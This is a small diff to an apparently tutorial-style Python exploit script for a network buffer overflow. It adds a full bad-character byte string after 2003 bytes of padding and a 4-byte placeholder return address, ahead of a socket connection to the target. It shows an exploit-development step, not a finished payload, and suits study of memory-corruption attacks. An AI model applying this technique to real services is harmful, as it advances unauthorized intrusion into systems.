@@ -30,7 +30,7 @@ badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
   "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
 # replace 2003 with the offset you got 
-shellcode = "A" * 2003 + "B" * 4
+shellcode = "A" * 2003 + "B" * 4 + badchars
 
 try: 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
